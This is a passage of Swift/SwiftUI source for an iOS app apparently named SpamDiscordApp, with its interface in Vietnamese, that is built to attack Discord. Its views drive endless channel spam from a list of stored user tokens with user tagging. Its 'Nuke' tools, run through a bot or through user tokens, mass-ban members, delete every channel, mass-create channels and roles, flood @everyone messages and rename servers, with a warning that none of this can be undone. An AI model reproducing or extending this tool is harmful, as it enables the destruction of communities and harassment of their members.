            LicenseAdminInfoView().environmentObject(license)
        }
    }

    private func fmt(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "dd/MM/yyyy"
        return df.string(from: d)
    }
}

// ==========================================
// MARK: - ADMIN INFO VIEW
// ==========================================
struct LicenseAdminInfoView: View {
    @EnvironmentObject var license: LicenseManager
    @Environment(\.dismiss) var dismiss

    var body: some View {
        NavigationStack {
            ScrollView {
                VStack(alignment: .leading, spacing: 16) {
                    Text("THÔNG TIN ADMIN")
                        .font(.headline)

                    VStack(alignment: .leading, spacing: 8) {
                        Text("API Endpoint").font(.caption.bold()).foregroundStyle(.secondary)
                        Text(LicenseAPIClient.shared.baseURL)
                            .font(.system(.caption, design: .monospaced))
                            .textSelection(.enabled)
                    }
                    .padding()
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground))
                    .cornerRadius(10)

                    if let k = license.licenseKey {
                        VStack(alignment: .leading, spacing: 8) {
                            Text("KEY HIỆN TẠI").font(.caption.bold()).foregroundStyle(.secondary)
                            Text(k).font(.system(.caption, design: .monospaced))
                                .textSelection(.enabled)
                            Text(license.statusText).font(.caption2).foregroundStyle(.green)
                        }
                        .padding()
                        .frame(maxWidth: .infinity, alignment: .leading)
                        .background(Color(UIColor.secondarySystemBackground))
                        .cornerRadius(10)
                    }

                    VStack(alignment: .leading, spacing: 8) {
                        Text("TẠO KEY MỚI (từ máy tính)").font(.caption.bold()).foregroundStyle(.secondary)
                        Text("""
                        curl -X POST \(LicenseAPIClient.shared.baseURL)/admin/create \\
                          -H "Authorization: Bearer YOUR_ADMIN_SECRET" \\
                          -H "Content-Type: application/json" \\
                          -d '{"email":"user@example.com","duration_days":365}'
                        """)
                        .font(.system(size: 10, design: .monospaced))
                        .padding(8)
                        .background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(6)
                        .textSelection(.enabled)
                    }
                    .padding()
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground))
                    .cornerRadius(10)

                    VStack(alignment: .leading, spacing: 8) {
                        Text("LỆNH QUẢN LÝ (curl)").font(.caption.bold()).foregroundStyle(.secondary)
                        Text("""
                        # Thu hồi key
                        curl -X POST \(LicenseAPIClient.shared.baseURL)/admin/disable \\
                          -H "Authorization: Bearer YOUR_ADMIN_SECRET" \\
                          -d '{"license_key":"QT-XXXXX-XXXXX"}'
                        """)
                        .font(.system(size: 10, design: .monospaced))
                        .padding(8)
                        .background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(6)
                        .textSelection(.enabled)
                    }
                    .padding()
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground))
                    .cornerRadius(10)

                    Button(role: .destructive) {
                        license.deactivate()
                        dismiss()
                    } label: {
                        Label("Xoá key hiện tại", systemImage: "trash")
                            .frame(maxWidth: .infinity).padding(10)
                    }
                    .background(Color.red.opacity(0.15)).foregroundStyle(.red)
                    .cornerRadius(8)
                }
                .padding()
            }
            .navigationTitle("Admin Info")
            .navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .cancellationAction) {
                    Button("Đóng") { dismiss() }
                }
            }
        }
    }
}

// ==========================================
// MARK: - APP ENTRY
// ==========================================
@main
struct SpamDiscordApp: App {
    @StateObject private var app = AppState()
    @StateObject private var bot = BotManager()
    @StateObject private var userNuke = UserNukeManager()
    @StateObject private var license = LicenseManager.shared
    @Environment(\.scenePhase) private var scenePhase

    var body: some Scene {
        WindowGroup {
            Group {
                if license.isUnlocked {
                    MainTabView()
                        .environmentObject(app)
                        .environmentObject(bot)
                        .environmentObject(userNuke)
                } else {
                    LockView()
                        .environmentObject(license)
                }
            }
            .onChange(of: scenePhase) { phase in
                if phase == .active {
                    Task { @MainActor in
                        await license.refreshStatus()
                    }
                }
            }
        }
    }
}

struct MainTabView: View {
    var body: some View {
        TabView {
            SpamView().tabItem { Label("Spam", systemImage: "paperplane.fill") }
            TokenListView().tabItem { Label("Tokens", systemImage: "person.2.fill") }
            NukeTabView().tabItem { Label("Nuke", systemImage: "flame.fill") }
        }.tint(.indigo)
    }
}

struct NukeTabView: View {
    @State private var mode: Mode = .bot
    enum Mode { case bot, user }
    var body: some View {
        VStack(spacing: 0) {
            Picker("", selection: $mode) {
                Text("Bot").tag(Mode.bot)
                Text("User Token").tag(Mode.user)
            }.pickerStyle(.segmented).padding(.horizontal).padding(.vertical, 6)
            if mode == .bot { BotNukeView() } else { UserNukeView() }
        }
    }
}

// ==========================================
// MARK: - EMPTY STATE
// ==========================================
struct EmptyStateView: View {
    let title, systemImage, description: String
    var body: some View {
        VStack(spacing: 15) {
            Image(systemName: systemImage).font(.system(size: 50)).foregroundStyle(.secondary)
            Text(title).font(.title2).bold()
            Text(description).font(.subheadline).foregroundStyle(.secondary)
                .multilineTextAlignment(.center).padding(.horizontal)
        }.frame(maxWidth: .infinity, maxHeight: .infinity).background(Color(UIColor.systemGroupedBackground))
    }
}

// ==========================================
// MARK: - TOKEN VIEWS
// ==========================================
struct TokenListView: View {
    @EnvironmentObject var app: AppState
    @State private var showAdd = false
    @State private var showImport = false
    var body: some View {
        NavigationStack {
            Group {
                if app.tokens.isEmpty {
                    EmptyStateView(title: "Chưa có Token", systemImage: "key.slash", description: "Thêm token để bắt đầu.")
                } else {
                    List {
                        Section(header: Text("Danh sách")) {
                            ForEach(app.tokens) { t in
                                Button { app.setActiveToken(t) } label: {
                                    HStack(spacing: 12) {
                                        if let url = t.avatarURL {
                                            AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                            placeholder: { Circle().fill(Color.gray.opacity(0.3)) }
                                                .frame(width: 45, height: 45).clipShape(Circle())
                                        } else {
                                            Image(systemName: "person.circle.fill").resizable()
                                                .frame(width: 45, height: 45).foregroundStyle(.gray)
                                        }
                                        VStack(alignment: .leading, spacing: 4) {
                                            Text(t.username).font(.headline)
                                            Text(t.isValid ? "Live" : "Die").font(.caption).bold()
                                                .foregroundStyle(t.isValid ? .green : .red)
                                        }
                                        Spacer()
                                        if app.activeToken?.id == t.id {
                                            Image(systemName: "checkmark.circle.fill").foregroundStyle(.indigo).font(.title3)
                                        }
                                    }.padding(.vertical, 4)
                                }.buttonStyle(.plain).disabled(!t.isValid)
                            }.onDelete(perform: app.deleteToken)
                        }
                    }
                }
            }
            .navigationTitle("Quản lý Token")
            .toolbar {
                ToolbarItem(placement: .topBarTrailing) {
                    Menu {
                        Button("Thêm tay", systemImage: "keyboard") { showAdd = true }
                        Button("Nhập file", systemImage: "doc.text") { showImport = true }
                    } label: { Image(systemName: "plus.circle.fill").font(.title3) }
                }
            }
            .sheet(isPresented: $showAdd) { AddTokenSheet() }
            .sheet(isPresented: $showImport) {
                DocumentPicker(contentTypes: [.item]) { u in Task { await app.addTokensFromFile(url: u) } }
            }
            .overlay {
                if app.isCheckingToken {
                    ProgressView("Đang check...").padding()
                        .background(.ultraThinMaterial, in: RoundedRectangle(cornerRadius: 12))
                }
            }
        }
    }
}

struct AddTokenSheet: View {
    @EnvironmentObject var app: AppState
    @Environment(\.dismiss) var dismiss
    @State private var input = ""
    var body: some View {
        NavigationStack {
            Form {
                Section(header: Text("Nhập Token")) {
                    TextField("Dán token...", text: $input)
                        .autocorrectionDisabled().textInputAutocapitalization(.never)
                }
            }
            .navigationTitle("Thêm Token").navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { dismiss() } }
                ToolbarItem(placement: .confirmationAction) {
                    Button("Lưu") { Task { await app.addToken(input); dismiss() } }
                        .disabled(input.isEmpty || app.isCheckingToken)
                }
            }
        }
    }
}

// ==========================================
// MARK: - SPAM VIEWS
// ==========================================
struct SpamView: View {
    @EnvironmentObject var app: AppState
    @State private var searchText = ""
    var filtered: [Guild] {
        searchText.isEmpty ? app.guilds : app.guilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }
    var body: some View {
        NavigationStack {
            Group {
                if app.activeToken == nil {
                    EmptyStateView(title: "Chưa chọn Token", systemImage: "exclamationmark.triangle",
                                   description: "Vào tab Tokens để thêm.")
                } else if app.isLoading { ProgressView("Đang tải...") }
                else {
                    List(filtered) { g in
                        NavigationLink(value: g) {
                            HStack {
                                if let icon = g.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(.gray) }.frame(width: 35, height: 35).clipShape(Circle())
                                } else { Circle().fill(.gray.opacity(0.3)).frame(width: 35, height: 35) }
                                Text(g.name).fontWeight(.medium)
                            }
                        }
                    }.searchable(text: $searchText, prompt: "Tìm Server...")
                }
            }
            .navigationTitle("Chọn Server")
            .navigationDestination(for: Guild.self) { ChannelListView(guild: $0) }
            .refreshable { await app.loadGuilds() }
        }
    }
}

struct ChannelListView: View {
    @EnvironmentObject var app: AppState
    let guild: Guild
    @State private var searchText = ""
    var sections: [(category: Channel?, items: [Channel])] {
        let s = app.groupedChannels()
        if searchText.isEmpty { return s }
        return s.compactMap { sec in
            let f = sec.items.filter { $0.displayName.localizedCaseInsensitiveContains(searchText) }
            return f.isEmpty ? nil : (sec.category, f)
        }
    }
    var body: some View {
        Group {
            if app.isLoading { ProgressView() }
            else {
                List {
                    ForEach(sections, id: \.category?.id) { sec in
                        Section(header: Text(sec.category?.displayName.uppercased() ?? "KHÁC").font(.caption).bold()) {
                            ForEach(sec.items) { c in
                                NavigationLink(value: c) {
                                    HStack {
                                        Image(systemName: c.type == 5 ? "megaphone" : "number").foregroundStyle(.secondary)
                                        Text(c.displayName)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        .searchable(text: $searchText, prompt: "Tìm kênh...")
        .navigationTitle(guild.name)
        .task { await app.loadChannels(for: guild) }
        .navigationDestination(for: Channel.self) { SendView(channel: $0) }
    }
}

struct SendView: View {
    @EnvironmentObject var app: AppState
    let channel: Channel
    @State private var showImport = false
    @State private var showErr = false
    var body: some View {
        ScrollView {
            VStack(spacing: 16) {
                HStack {
                    Image(systemName: "number.circle.fill").font(.title).foregroundStyle(.indigo)
                    Text(channel.displayName).font(.title2.bold())
                    Spacer()
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                VStack(alignment: .leading, spacing: 12) {
                    Text("CẤU HÌNH").font(.caption).bold().foregroundStyle(.secondary)
                    Toggle("Tag User ID", isOn: $app.useTag).tint(.indigo)
                    if app.useTag {
                        TextField("User ID", text: $app.targetUserId).keyboardType(.numberPad)
                            .padding(10).background(Color(UIColor.tertiarySystemBackground)).cornerRadius(8)
                    }
                    HStack {
                        Toggle("Thêm '>'", isOn: $app.addPrefix).tint(.indigo)
                        Toggle("Thêm '#'", isOn: $app.addSuffix).tint(.indigo)
                    }
                    VStack(alignment: .leading, spacing: 8) {
                        HStack {
                            Text("Delay:")
                            Spacer()
                            Text("\(String(format: "%.1f", app.delaySeconds))s").bold()
                                .foregroundStyle(app.delaySeconds < 1.0 ? .red : .indigo)
                        }
                        Slider(value: $app.delaySeconds, in: 0.1...5.0, step: 0.1).tint(.indigo)
                    }
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                VStack(alignment: .leading, spacing: 10) {
                    HStack {
                        Text("NỘI DUNG TIN NHẮN").font(.caption).bold().foregroundStyle(.secondary)
                        Spacer()
                        Button { showImport = true } label: {
                            Label("Import", systemImage: "doc.badge.plus").font(.caption).bold()
                        }
                    }
                    ZStack(alignment: .topTrailing) {
                        TextEditor(text: $app.inputText)
                            .frame(height: 100).padding(8)
                            .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(10)
                            .onChange(of: app.inputText) { _ in app.parseDirectInput() }
                        if !app.inputText.isEmpty {
                            Button { app.inputText = ""; app.parseDirectInput() } label: {
                                Image(systemName: "xmark.circle.fill").foregroundStyle(.gray).padding(12)
                            }
                        }
                    }
                    if !app.messages.isEmpty {
                        Text("Nhận diện: \(app.messages.count) dòng").font(.caption).foregroundStyle(.green)
                    }
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                if app.isSending {
                    VStack(spacing: 12) {
                        ProgressView().scaleEffect(1.5).tint(.indigo).padding(.top)
                        Text("Đang gửi vô hạn...").font(.headline)
                        Text("Tổng: \(app.totalSent)").font(.subheadline).foregroundStyle(.secondary)
                        Text(app.currentMessageStr).font(.caption).foregroundStyle(.gray)
                            .lineLimit(2).multilineTextAlignment(.center).padding(.horizontal)
                        if let e = app.lastError { Text(e).font(.caption).foregroundStyle(.red) }
                        Button { app.stopSending() } label: {
                            Text("DỪNG LẠI").bold().frame(maxWidth: .infinity).padding()
                        }.background(Color.red).foregroundStyle(.white).cornerRadius(12)
                    }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
                } else {
                    Button { app.startSending(channel: channel) } label: {
                        Text("BẮT ĐẦU GỬI").bold().frame(maxWidth: .infinity).padding()
                    }.background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
                    .disabled(app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty))
                    .opacity((app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty)) ? 0.5 : 1)
                }
            }.padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
        .navigationTitle("Gửi tin nhắn").navigationBarTitleDisplayMode(.inline)
        .toolbar { ToolbarItemGroup(placement: .keyboard) { Spacer(); Button("Xong") { app.hideKeyboard() } } }
        .sheet(isPresented: $showImport) {
            DocumentPicker(contentTypes: [.item]) { u in
                app.parseFile(url: u)
                if app.lastError != nil { showErr = true }
            }
        }
        .alert("Lỗi", isPresented: $showErr) { Button("OK", role: .cancel) {} }
        message: { Text(app.lastError ?? "Lỗi") }
    }
}

// ==========================================
// MARK: - BOT NUKE VIEWS
// ==========================================
struct BotNukeView: View {
    @EnvironmentObject var bot: BotManager
    @State private var selectedGuild: Guild?
    var body: some View {
        NavigationStack {
            Group {
                if bot.config == nil { BotSetupView() }
                else if bot.isNuking { BotNukeRunningView() }
                else if let g = selectedGuild { NukeOptionsView(guild: g, selectedGuild: $selectedGuild, mode: .bot, permissions: nil) }
                else { BotGuildListView(selectedGuild: $selectedGuild) }
            }
            .navigationTitle(navTitle).navigationBarTitleDisplayMode(.inline)
        }
    }
    private var navTitle: String {
        if bot.config == nil { return "Bot Nuke" }
        if bot.isNuking { return "Đang chạy..." }
        if let g = selectedGuild { return g.name }
        return "Chọn Server"
    }
}

struct BotSetupView: View {
    @EnvironmentObject var bot: BotManager
    @State private var tokenInput = ""
    var body: some View {
        ScrollView {
            VStack(spacing: 20) {
                Image(systemName: "server.rack").font(.system(size: 60)).foregroundStyle(.red).padding(.top, 30)
                Text("BOT NUKE").font(.largeTitle.bold())

                VStack(alignment: .leading, spacing: 12) {
                    Text("BOT TOKEN").font(.caption).bold().foregroundStyle(.secondary)
                    SecureField("Dán bot token...", text: $tokenInput)
                        .textInputAutocapitalization(.never).autocorrectionDisabled()
                        .padding(12).background(Color(UIColor.tertiarySystemBackground))
                        .cornerRadius(10).font(.system(.body, design: .monospaced))
                    Text("Developer Portal → Applications → Bot → Reset Token")
                        .font(.caption2).foregroundStyle(.secondary)
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                if let e = bot.tokenError { Text(e).font(.caption).foregroundStyle(.red).multilineTextAlignment(.center) }

                Button { Task { await bot.setToken(tokenInput) } } label: {
                    HStack {
                        if bot.isCheckingToken { ProgressView().tint(.white) }
                        else { Image(systemName: "checkmark.shield.fill") }
                        Text(bot.isCheckingToken ? "Đang kiểm tra..." : "KẾT NỐI BOT").bold()
                    }.frame(maxWidth: .infinity).padding()
                }.background(Color.red).foregroundStyle(.white).cornerRadius(12)
                .disabled(tokenInput.isEmpty || bot.isCheckingToken)
                .opacity(tokenInput.isEmpty ? 0.5 : 1)

                VStack(alignment: .leading, spacing: 8) {
                    Text("YÊU CẦU").font(.caption).bold().foregroundStyle(.secondary)
                    Label("Bot đã vào server", systemImage: "checkmark.circle")
                    Label("Bật Server Members Intent", systemImage: "checkmark.circle")
                    Label("Quyền Administrator", systemImage: "checkmark.circle")
                }.font(.caption).frame(maxWidth: .infinity, alignment: .leading)
                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
            }.padding()
        }
    }
}

struct BotGuildListView: View {
    @EnvironmentObject var bot: BotManager
    @Binding var selectedGuild: Guild?
    @State private var searchText = ""
    var filtered: [Guild] {
        searchText.isEmpty ? bot.botGuilds : bot.botGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }
    var body: some View {
        VStack(spacing: 0) {
            if let c = bot.config {
                HStack(spacing: 12) {
                    if let url = c.avatarURL {
                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                        placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 42, height: 42).clipShape(Circle())
                    } else { Image(systemName: "cpu").font(.title2).frame(width: 42, height: 42) }
                    VStack(alignment: .leading, spacing: 2) {
                        Text(c.displayName).font(.subheadline.bold())
                        Text("Bot ID: \(c.userId)").font(.caption2).foregroundStyle(.secondary)
                    }
                    Spacer()
                    Menu {
                        Button("Đổi token", systemImage: "key") { bot.removeConfig() }
                        Button("Refresh", systemImage: "arrow.clockwise") { Task { await bot.loadGuilds() } }
                    } label: { Image(systemName: "ellipsis.circle").font(.title3) }
                }.padding().background(Color(UIColor.secondarySystemBackground))
            }
            if bot.isLoadingGuilds { ProgressView("Đang tải...").padding(.top, 40); Spacer() }
            else if bot.botGuilds.isEmpty {
                EmptyStateView(title: "Bot chưa vào server nào", systemImage: "server.rack", description: "Mời bot rồi Refresh.")
            } else {
                List(filtered) { g in
                    Button { selectedGuild = g } label: {
                        HStack(spacing: 12) {
                            if let icon = g.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 42, height: 42).clipShape(Circle())
                            } else { Circle().fill(.gray.opacity(0.3)).frame(width: 42, height: 42) }
                            VStack(alignment: .leading, spacing: 2) {
                                Text(g.name).font(.headline)
                                Text(g.id).font(.caption2).foregroundStyle(.secondary).monospaced()
                            }
                            Spacer()
                            Image(systemName: "chevron.right").foregroundStyle(.tertiary)
                        }.padding(.vertical, 4)
                    }.buttonStyle(.plain)
                }.searchable(text: $searchText, prompt: "Tìm...")
            }
        }
    }
}

// ==========================================
// MARK: - NUKE OPTIONS
// ==========================================
enum NukeMode { case bot, user }

struct NukeOptionsView: View {
    @EnvironmentObject var bot: BotManager
    @EnvironmentObject var userNuke: UserNukeManager
    let guild: Guild
    @Binding var selectedGuild: Guild?
    let mode: NukeMode
    let permissions: GuildPermissions?
    @State private var options = NukeConfig()

    var canRun: Bool { !options.enabledSteps.isEmpty }

    func stepPermitted(_ step: NukeStepType) -> Bool {
        guard let p = permissions else { return true }
        switch step {
        case .massBan: return p.massBan
        case .deleteChannels: return p.deleteChannels
        case .createChannels: return p.createChannels
        case .createRoles: return p.createRoles
        case .renameGuild: return p.renameGuild
        }
    }

    var body: some View {
        ScrollView {
            VStack(spacing: 14) {
                HStack {
                    Image(systemName: "exclamationmark.triangle.fill").foregroundStyle(.orange)
                    Text("KHÔNG THỂ HOÀN TÁC").font(.caption.bold())
                    Spacer()
                }.padding(12).background(Color.orange.opacity(0.15)).cornerRadius(10)

                HStack(spacing: 12) {
                    if let icon = guild.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(guild.id)/\(icon).png?size=64") {
                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                        placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 48, height: 48).clipShape(Circle())
                    } else { Circle().fill(.gray.opacity(0.3)).frame(width: 48, height: 48) }
                    VStack(alignment: .leading, spacing: 2) {
                        Text(guild.name).font(.headline)
                        Text(guild.id).font(.caption2.monospaced()).foregroundStyle(.secondary)
                    }
                    Spacer()
                    Button { selectedGuild = nil } label: {
                        Image(systemName: "xmark.circle.fill").foregroundStyle(.secondary).font(.title3)
                    }
                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)

                if let p = permissions {
                    VStack(alignment: .leading, spacing: 6) {
                        Text("QUYỀN KHẢ DỤNG").font(.caption).bold().foregroundStyle(.secondary)
                        HStack(spacing: 6) {
                            permBadge("Ban", p.massBan)
                            permBadge("Xóa", p.deleteChannels)
                            permBadge("Tạo kênh", p.createChannels)
                            permBadge("Role", p.createRoles)
                            permBadge("Rename", p.renameGuild)
                        }
                    }.padding().frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
                }

                VStack(alignment: .leading, spacing: 8) {
                    Text("THỨ TỰ & CHỨC NĂNG").font(.caption).bold().foregroundStyle(.secondary)
                    ForEach(Array(options.stepOrder.enumerated()), id: \.element) { idx, step in
                        stepCard(step: step, index: idx, total: options.stepOrder.count)
                    }
                }

                Button {
                    if let p = permissions {
                        options.enabledSteps = options.enabledSteps.filter { s in
                            switch s {
                            case .massBan: return p.massBan
                            case .deleteChannels: return p.deleteChannels
                            case .createChannels: return p.createChannels
                            case .createRoles: return p.createRoles
                            case .renameGuild: return p.renameGuild
                            }
                        }
                    }
                    if mode == .bot {
                        Task { await bot.runNuke(guild: guild, options: options) }
                    } else {
                        Task { await userNuke.runNuke(guild: guild, options: options) }
                    }
                } label: {
                    Text("BẮT ĐẦU NUKE (\(options.enabledSteps.count) bước)").bold()
                        .frame(maxWidth: .infinity).padding()
                }.background(canRun ? Color.red : Color.gray).foregroundStyle(.white).cornerRadius(12)
                .disabled(!canRun).padding(.top, 8)

                if !canRun { Text("Chọn ít nhất 1 bước").font(.caption).foregroundStyle(.secondary) }
            }.padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
    }

    @ViewBuilder
    func permBadge(_ text: String, _ ok: Bool) -> some View {
        HStack(spacing: 3) {
            Image(systemName: ok ? "checkmark.circle.fill" : "xmark.circle.fill")
                .font(.caption2).foregroundStyle(ok ? .green : .red)
            Text(text).font(.caption2).foregroundStyle(ok ? .primary : .secondary)
        }.padding(.horizontal, 6).padding(.vertical, 3)
        .background((ok ? Color.green : Color.red).opacity(0.12)).cornerRadius(5)
    }

    @ViewBuilder
    func stepCard(step: NukeStepType, index: Int, total: Int) -> some View {
        let permitted = stepPermitted(step)
        let isOn = options.enabledSteps.contains(step) && permitted

        VStack(spacing: 0) {
            HStack(spacing: 10) {
                VStack(spacing: 0) {
                    Button { if index > 0 { options.stepOrder.swapAt(index, index - 1) } } label: {
                        Image(systemName: "chevron.up").font(.caption.bold())
                    }.disabled(index == 0).buttonStyle(.plain)
                    Button { if index < total - 1 { options.stepOrder.swapAt(index, index + 1) } } label: {
                        Image(systemName: "chevron.down").font(.caption.bold())
                    }.disabled(index == total - 1).buttonStyle(.plain)
                }.foregroundStyle(.secondary)

                Text("\(index + 1)").font(.caption.bold()).foregroundStyle(.secondary).frame(width: 18)
                Image(systemName: step.icon).foregroundStyle(permitted ? .indigo : .gray).frame(width: 20)
                VStack(alignment: .leading, spacing: 1) {
                    Text(step.rawValue).font(.headline)
                    if !permitted { Text("Không có quyền").font(.caption2).foregroundStyle(.red) }
                }
                Spacer()
                Toggle("", isOn: Binding(
                    get: { isOn },
                    set: { v in
                        if v { options.enabledSteps.insert(step) } else { options.enabledSteps.remove(step) }
                    }
                )).labelsHidden().tint(.indigo)
                .disabled(!permitted)
            }.padding().opacity(permitted ? 1 : 0.6)

            if isOn && permitted {
                Divider()
                stepConfig(step: step).padding()
            }
        }.background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
    }

    @ViewBuilder
    func stepConfig(step: NukeStepType) -> some View {
        switch step {
        case .massBan:
            VStack(alignment: .leading, spacing: 10) {
                Text(mode == .user
                     ? "Ban member qua WebSocket, chia đều cho token có quyền ban."
                     : "Ban member có role thấp hơn bot.")
                    .font(.caption2).foregroundStyle(.secondary)
                if mode == .user {
                    TextField("Role ID để ban (trống = tất cả)", text: $options.banRoleId)
                        .keyboardType(.numberPad).textFieldStyle(.roundedBorder)
                }
                speedSlider("Tốc độ ban (mỗi member)", value: $options.banDelay)
            }
        case .deleteChannels:
            VStack(alignment: .leading, spacing: 10) {
                Text("Xóa toàn bộ kênh hiện có.").font(.caption2).foregroundStyle(.secondary)
                speedSlider("Tốc độ xóa (mỗi kênh)", value: $options.deleteDelay)
            }
        case .renameGuild:
            TextField("Tên server mới", text: $options.newGuildName).textFieldStyle(.roundedBorder)
        case .createRoles:
            VStack(alignment: .leading, spacing: 10) {
                TextField("Tên role", text: $options.roleName).textFieldStyle(.roundedBorder)
                countInput("Số role", value: $options.roleCount)
                speedSlider("Tốc độ tạo role", value: $options.createRoleDelay)
            }
        case .createChannels:
            VStack(alignment: .leading, spacing: 10) {
                TextField("Tên kênh", text: $options.channelName).textFieldStyle(.roundedBorder)
                countInput("Số kênh", value: $options.channelCount)
                TextField("Nội dung tin nhắn", text: $options.messageContent, axis: .vertical)
                    .textFieldStyle(.roundedBorder).lineLimit(2...5)
                Toggle("Tag @everyone", isOn: $options.tagEveryone).tint(.green)
                speedSlider("Tốc độ tạo kênh", value: $options.createChDelay)
                speedSlider("Tốc độ gửi tin", value: $options.msgDelay)
            }
        }
    }

    @ViewBuilder
    func speedSlider(_ label: String, value: Binding<Double>) -> some View {
        VStack(alignment: .leading, spacing: 4) {
            HStack {
                Text(label).font(.caption)
                Spacer()
                Text(String(format: "%.2fs", value.wrappedValue))
                    .font(.caption.bold()).monospacedDigit().foregroundStyle(.indigo)
            }
            Slider(value: value, in: 0...1, step: 0.01).tint(.indigo)
        }
    }

    @ViewBuilder
    func countInput(_ label: String, value: Binding<Int>) -> some View {
        HStack {
            Text(label).font(.subheadline)
            Spacer()
            TextField("", value: value, format: .number)
                .keyboardType(.numberPad)
                .multilineTextAlignment(.trailing)
                .frame(width: 70)
                .textFieldStyle(.roundedBorder)
                .onChange(of: value.wrappedValue) { v in
                    if v < 1 { value.wrappedValue = 1 }
                    if v > 500 { value.wrappedValue = 500 }
                }
            Text("/ 500").font(.caption).foregroundStyle(.secondary)
        }
    }
}

// ==========================================
// MARK: - NUKE RUNNING UI
// ==========================================
struct NukeRunningUI: View {
    let phase: String
    let progress: Double
    let banOk, banFail, chDel, chCreate, msgSent, roleCreate: Int
    let log: [String]
    let onStop: () -> Void

    var body: some View {
        VStack(spacing: 0) {
            VStack(spacing: 8) {
                HStack {
                    Text("ĐANG NUKE").font(.title2.bold())
                    Spacer()
                    ProgressView().tint(.red)
                }
                HStack(spacing: 6) {
                    Circle().fill(.red).frame(width: 8, height: 8)
                    Text(phase.isEmpty ? "Đang khởi động..." : phase)
                        .font(.subheadline).foregroundStyle(.secondary)
                    Spacer()
                    Text("\(Int(progress * 100))%").font(.caption.bold()).foregroundStyle(.red)
                }
                ProgressView(value: progress).tint(.red)
            }.padding().background(Color.red.opacity(0.08))

            HStack(spacing: 8) {
                statCard("Ban", "\(banOk)/\(banOk+banFail)", .red)
                statCard("Xóa kênh", "\(chDel)", .orange)
                statCard("Tạo kênh", "\(chCreate)", .green)
                statCard("Role", "\(roleCreate)", .purple)
            }.padding(.horizontal).padding(.top, 10)

            ScrollViewReader { proxy in
                ScrollView {
                    LazyVStack(alignment: .leading, spacing: 2) {
                        ForEach(Array(log.enumerated()), id: \.offset) { i, line in
                            Text(line)
                                .font(.system(size: 11, design: .monospaced))
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .id(i)
                        }
                    }.padding(12)
                }
                .background(Color(UIColor.secondarySystemBackground))
                .cornerRadius(12).padding(.horizontal).padding(.top, 10)
                .onChange(of: log.count) { _ in
                    if let last = log.indices.last {
                        withAnimation { proxy.scrollTo(last, anchor: .bottom) }
                    }
                }
            }

            Button(action: onStop) {
                Text("DỪNG LẠI").bold().frame(maxWidth: .infinity).padding()
            }.background(Color.red).foregroundStyle(.white).cornerRadius(12).padding()
        }
        .background(Color(UIColor.systemGroupedBackground))
        .navigationBarBackButtonHidden(true)
    }

    func statCard(_ title: String, _ value: String, _ color: Color) -> some View {
        VStack(spacing: 2) {
            Text(value).font(.title3.bold()).foregroundStyle(color)
            Text(title).font(.caption2).foregroundStyle(.secondary)
        }.frame(maxWidth: .infinity).padding(.vertical, 8)
        .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
    }
}

struct BotNukeRunningView: View {
    @EnvironmentObject var bot: BotManager
    var body: some View {
        NukeRunningUI(
            phase: bot.currentPhase, progress: bot.phaseProgress,
            banOk: bot.banSuccess, banFail: bot.banFailed,
            chDel: bot.channelsDeleted, chCreate: bot.channelsCreated,
            msgSent: bot.messagesSent, roleCreate: bot.rolesCreated,
            log: bot.nukeLog, onStop: { bot.stopNuke() }
        )
    }
}

// ==========================================
// MARK: - USER NUKE VIEWS
// ==========================================
struct UserNukeView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @State private var selectedGuild: Guild?
    var body: some View {
        NavigationStack {
            Group {
                if userNuke.isNuking { UserNukeRunningView() }
                else if let g = selectedGuild {
                    NukeOptionsView(guild: g, selectedGuild: $selectedGuild, mode: .user,
                                    permissions: userNuke.permissionsForGuild(g.id))
                }
                else if userNuke.selectedTokenIds.isEmpty { UserNukeTokenPickerView(selectedGuild: $selectedGuild) }
                else { UserNukeGuildListView(selectedGuild: $selectedGuild) }
            }
            .navigationTitle(navTitle).navigationBarTitleDisplayMode(.inline)
        }
    }
    private var navTitle: String {
        if userNuke.isNuking { return "Đang chạy..." }
        if let g = selectedGuild { return g.name }
